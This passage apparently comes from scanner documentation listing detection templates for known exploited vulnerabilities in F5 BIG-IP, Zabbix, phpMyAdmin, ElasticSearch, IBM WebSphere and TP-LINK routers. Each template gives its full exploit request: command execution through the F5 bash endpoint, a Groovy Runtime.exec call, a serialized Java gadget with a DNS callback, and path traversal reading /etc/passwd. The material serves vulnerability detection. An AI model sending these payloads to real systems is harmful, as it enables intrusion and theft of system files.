- tags - f5,bigip,cve,cve2022,rce,mirai,kev

## Requests

### Step - 1

```
POST /mgmt/tm/util/bash HTTP/1.1
Host: {{Hostname}}
Connection: keep-alive, X-F5-Auth-Token
X-F5-Auth-Token: a
Authorization: Basic {{base64(auth)}}
Content-Type: application/json

{
     "command": "run",
     "utilCmdArgs": "-c '{{cmd}}'"
}

```

### Step - 2

```
POST /mgmt/tm/util/bash HTTP/1.1
Host: localhost
Connection: keep-alive, X-F5-Auth-Token
X-F5-Auth-Token: a
Authorization: Basic {{base64(auth)}}
Content-Type: application/json

{
     "command": "run",
     "utilCmdArgs": "-c '{{cmd}}'"
}

```

### Matchers

**Type - word**

- part - body
- words
  1. commandResult
  2. 8831-2202-EVC
- condition - and

---

# Zabbix Setup Configuration Authentication Bypass

## Description

- After the initial setup process, some steps of setup.php file are reachable not only by super-administrators but also by unauthenticated users. A malicious actor can pass step checks and potentially change the configuration of Zabbix Frontend.
- severity - medium
- tags - cve,cve2022,zabbix,auth-bypass,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/zabbix/setup.php
- {{BaseURL}}/setup.php

### Matchers

**Type - word**

- words
  1. Database
  2. host
  3. port
  4. Zabbix
- condition - and

**Type - status**

- status
  1. 200

---

# PhpMyAdmin Scripts - Remote Code Execution

## Description

- PhpMyAdmin Scripts 2.11.x before 2.11.9.5 and 3.x before 3.1.3.1 are susceptible to a remote code execution in setup.php that allows remote attackers to inject arbitrary PHP code into a configuration file via the save action. Combined with the ability to save files on server, this can allow unauthenticated users to execute arbitrary PHP code.
- severity - critical
- tags - deserialization,kev,vulhub,cve,cve2009,phpmyadmin,rce

## Requests

### Step - 1

```
POST /scripts/setup.php HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Accept: */*
Content-Type: application/x-www-form-urlencoded

action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}

```

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# ElasticSearch - Remote Code Execution

## Description

- ElasticSearch before 1.3.8 and 1.4.x before 1.4.3 allows remote attackers to bypass the sandbox protection mechanism and execute arbitrary shell commands via a crafted script to the Groovy scripting engine.
- severity - critical
- tags - cve,cve2015,elastic,rce,elasticsearch,kev

## Requests

### Step - 1

```
POST /website/blog/ HTTP/1.1
Host: {{Hostname}}
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded

{
  "name": "test"
}

```

### Step - 2

```
POST /_search HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getText()"}}}

```

### Matchers

**Type - word**

- words
  1. application/json
- part - header

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200

---

# IBM WebSphere Java Object Deserialization - Remote Code Execution

## Description

- IBM Websphere Application Server 7, 8, and 8.5 have a deserialization vulnerability in the SOAP Connector (port 8880 by default).
- severity - critical
- tags - cve,cve2015,websphere,deserialization,rce,oast,ibm,java,kev

## Requests

### Step - 1

```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml; charset=utf-8
SOAPAction: "urn:AdminService"

<?xml version='1.0' encoding='UTF-8'?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<SOAP-ENV:Header ns0:JMXConnectorContext="rO0ABXNyAA9qYXZhLnV0aWwuU3RhY2sQ/irCuwmGHQIAAHhyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAF1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKc3IAOmNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3IuSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnTblRMyYyF8sQIABUwACGNlbGxOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAIaG9zdE5hbWVxAH4AB0wACG5vZGVOYW1lcQB+AAdMAApzZXJ2ZXJOYW1lcQB+AAdbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7eHB0AAB0AAhMYXAzOTAxM3EAfgAKcQB+AAp1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAACpzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4AB0wACGZpbGVOYW1lcQB+AAdMAAptZXRob2ROYW1lcQB+AAd4cAAAAEt0ADpjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHRFbGVtZW50dAAfSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnQuamF2YXQABjxpbml0PnNxAH4ADgAAADx0ADNjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHR0ABhKTVhDb25uZWN0b3JDb250ZXh0LmphdmF0AARwdXNoc3EAfgAOAAAGQ3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAcZ2V0Sk1YQ29ubmVjdG9yQ29udGV4dEhlYWRlcnNxAH4ADgAAA0h0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQAEmludm9rZVRlbXBsYXRlT25jZXNxAH4ADgAAArF0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQADmludm9rZVRlbXBsYXRlc3EAfgAOAAACp3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAOaW52b2tlVGVtcGxhdGVzcQB+AA4AAAKZdAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA4AAAHndAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA7/////dAAVY29tLnN1bi5wcm94eS4kUHJveHkwcHQABmludm9rZXNxAH4ADgAAAOB0ACVjb20uaWJtLndzLm1hbmFnZW1lbnQuQWRtaW5DbGllbnRJbXBsdAAUQWRtaW5DbGllbnRJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAADYdAA9Y29tLmlibS53ZWJzcGhlcmUubWFuYWdlbWVudC5jb25maWdzZXJ2aWNlLkNvbmZpZ1NlcnZpY2VQcm94eXQAF0NvbmZpZ1NlcnZpY2VQcm94eS5qYXZhdAARZ2V0VW5zYXZlZENoYW5nZXNzcQB+AA4AAAwYdAAmY29tLmlibS53cy5zY3JpcHRpbmcuQWRtaW5Db25maWdDbGllbnR0ABZBZG1pbkNvbmZpZ0NsaWVudC5qYXZhdAAKaGFzQ2hhbmdlc3NxAH4ADgAAA/Z0AB5jb20uaWJtLndzLnNjcmlwdGluZy5XYXN4U2hlbGx0AA5XYXN4U2hlbGwuamF2YXQACHRpbWVUb0dvc3EAfgAOAAAFm3QAImNvbS5pYm0ud3Muc2NyaXB0aW5nLkFic3RyYWN0U2hlbGx0ABJBYnN0cmFjdFNoZWxsLmphdmF0AAtpbnRlcmFjdGl2ZXNxAH4ADgAACPp0ACJjb20uaWJtLndzLnNjcmlwdGluZy5BYnN0cmFjdFNoZWxsdAASQWJzdHJhY3RTaGVsbC5qYXZhdAADcnVuc3EAfgAOAAAElHQAHmNvbS5pYm0ud3Muc2NyaXB0aW5nLldhc3hTaGVsbHQADldhc3hTaGVsbC5qYXZhdAAEbWFpbnNxAH4ADv////50ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQAB2ludm9rZTBzcQB+AA4AAAA8dAAkc3VuLnJlZmxlY3QuTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsdAAdTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAAAldAAoc3VuLnJlZmxlY3QuRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbHQAIURlbGVnYXRpbmdNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAAmN0ABhqYXZhLmxhbmcucmVmbGVjdC5NZXRob2R0AAtNZXRob2QuamF2YXQABmludm9rZXNxAH4ADgAAAOp0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAKbGF1bmNoTWFpbnNxAH4ADgAAAGB0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAEbWFpbnNxAH4ADgAAAE10ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAADcnVuc3EAfgAO/////nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAACS3QANG9yZy5lY2xpcHNlLmVxdWlub3guaW50ZXJuYWwuYXBwLkVjbGlwc2VBcHBDb250YWluZXJ0ABhFY2xpcHNlQXBwQ29udGFpbmVyLmphdmF0ABdjYWxsTWV0aG9kV2l0aEV4Y2VwdGlvbnNxAH4ADgAAAMZ0ADFvcmcuZWNsaXBzZS5lcXVpbm94LmludGVybmFsLmFwcC5FY2xpcHNlQXBwSGFuZGxldAAVRWNsaXBzZUFwcEhhbmRsZS5qYXZhdAADcnVuc3EAfgAOAAAAbnQAPG9yZy5lY2xpcHNlLmNvcmUucnVudGltZS5pbnRlcm5hbC5hZGFwdG9yLkVjbGlwc2VBcHBMYXVuY2hlcnQAF0VjbGlwc2VBcHBMYXVuY2hlci5qYXZhdAAOcnVuQXBwbGljYXRpb25zcQB+AA4AAABPdAA8b3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmludGVybmFsLmFkYXB0b3IuRWNsaXBzZUFwcExhdW5jaGVydAAXRWNsaXBzZUFwcExhdW5jaGVyLmphdmF0AAVzdGFydHNxAH4ADgAAAXF0AC9vcmcuZWNsaXBzZS5jb3JlLnJ1bnRpbWUuYWRhcHRvci5FY2xpcHNlU3RhcnRlcnQAE0VjbGlwc2VTdGFydGVyLmphdmF0AANydW5zcQB+AA4AAACzdAAvb3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmFkYXB0b3IuRWNsaXBzZVN0YXJ0ZXJ0ABNFY2xpcHNlU3RhcnRlci5qYXZhdAADcnVuc3EAfgAO/////nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAABVHQAHm9yZy5lY2xpcHNlLmNvcmUubGF1bmNoZXIuTWFpbnQACU1haW4uamF2YXQAD2ludm9rZUZyYW1ld29ya3NxAH4ADgAAARp0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AAhiYXNpY1J1bnNxAH4ADgAAA9V0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AANydW5zcQB+AA4AAAGQdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQADWxhdW5jaEVjbGlwc2VzcQB+AA4AAACjdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQABG1haW5wcHBwcHBwcHB4" xmlns:ns0="admin" ns0:WASRemoteRuntimeVersion="8.5.5.7" ns0:JMXMessageVersion="1.2.0" ns0:JMXVersion="1.2.0">
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<ns1:invoke xmlns:ns1="urn:AdminService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<objectname xsi:type="ns1:javax.management.ObjectName">rO0ABXNyABtqYXZheC5tYW5hZ2VtZW50Lk9iamVjdE5hbWUPA6cb620VzwMAAHhwdACxV2ViU3BoZXJlOm5hbWU9Q29uZmlnU2VydmljZSxwcm9jZXNzPXNlcnZlcjEscGxhdGZvcm09cHJveHksbm9kZT1MYXAzOTAxM05vZGUwMSx2ZXJzaW9uPTguNS41LjcsdHlwZT1Db25maWdTZXJ2aWNlLG1iZWFuSWRlbnRpZmllcj1Db25maWdTZXJ2aWNlLGNlbGw9TGFwMzkwMTNOb2RlMDFDZWxsLHNwZWM9MS4weA==</objectname>
<operationname xsi:type="xsd:string">getUnsavedChanges</operationname>
<params xsi:type="ns1:[Ljava.lang.Object;">{{ generate_java_gadget("dns", "{{interactsh-url}}", "base64-raw")}}</params>
<signature xsi:type="ns1:[Ljava.lang.String;">rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACRjb20uaWJtLndlYnNwaGVyZS5tYW5hZ2VtZW50LlNlc3Npb24=</signature>
</ns1:invoke>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>

```

### Matchers

**Type - status**

- status
  1. 500

**Type - word**

- words
  1. SOAP-ENV:Server
  2. \<faultcode>
- condition - and

**Type - word**

- part - interactsh_protocol
- words
  1. dns

---

# TP-LINK - Local File Inclusion

## Description

- TP-LINK is susceptible to local file inclusion in these products: Archer C5 (1.2) with firmware before 150317, Archer C7 (2.0) with firmware before 150304, and C8 (1.0) with firmware before 150316, Archer C9 (1.0), TL-WDR3500 (1.0), TL-WDR3600 (1.0), and TL-WDR4300 (1.0) with firmware before 150302, TL-WR740N (5.0) and TL-WR741ND (5.0) with firmware before 150312, and TL-WR841N (9.0), TL-WR841N (10.0), TL-WR841ND (9.0), and TL-WR841ND (10.0) with firmware before 150310. Because of insufficient input validation, arbitrary local files can be disclosed. Files that include passwords and other sensitive information can be accessed.

- severity - high
- tags - router,lfi,seclists,cve,cve2015,tplink,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/login/../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---
